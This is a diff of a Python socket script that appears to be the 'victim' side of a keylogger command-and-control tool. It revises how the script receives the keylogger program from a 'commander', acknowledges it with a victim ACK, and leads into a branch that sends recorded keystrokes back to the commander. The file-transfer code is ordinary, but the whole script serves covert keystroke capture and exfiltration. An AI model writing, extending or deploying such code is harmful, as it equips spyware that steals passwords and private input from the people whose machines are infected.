@@ -93,8 +93,9 @@ if __name__ == '__main__':
 
 # b) Command to GET keylog program from commander
                 if data.decode() == constants.GET_KEYLOGGER_MSG:
+                    print(constants.CLIENT_RESPONSE.format(constants.GET_KEYLOGGER_MSG))
+
                     # Send an initial acknowledgement to the client (giving them green light for transfer)
-                    print(constants.CLIENT_RESPONSE.format(data.decode()))
                     client_socket.send(constants.RECEIVED_CONFIRMATION_MSG.encode())
 
                     # Call to receive the file data and checksum from the client
@@ -102,18 +103,25 @@ if __name__ == '__main__':
                     print(constants.RECEIVING_FILE_MSG.format(filename))
 
                     with open(filename, constants.WRITE_BINARY_MODE) as file:
+                        eof_marker = b"EOF"  # Define the end-of-file marker
+
                         while True:
-                            data = client_socket.recv(1024)
-                            if not data:
+                            file_data = client_socket.recv(1024)
+                            if not file_data:
+                                break  # No more data received
+                            if file_data.endswith(eof_marker):
+                                file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                                print(constants.TRANSFER_SUCCESS_MSG.format(filename))
                                 break
-                            if data.endswith(constants.END_OF_FILE_SIGNAL):  # EOF signal (prevent recv() blocking)
-                                data = data[:-len(constants.END_OF_FILE_SIGNAL)]
-                                file.write(data)
-                                break
-                            file.write(data)
+                            else:
+                                file.write(file_data)
 
-                    print(constants.TRANSFER_SUCCESS_MSG.format(filename))
-
+                    # Send ACK to commander (if good)
+                    if is_file_openable(filename):
+                        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
+                        client_socket.send(constants.VICTIM_ACK.encode())
+                    else:
+                        client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
 # c) Check if data is to send recorded keystroked file to commander
                 if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
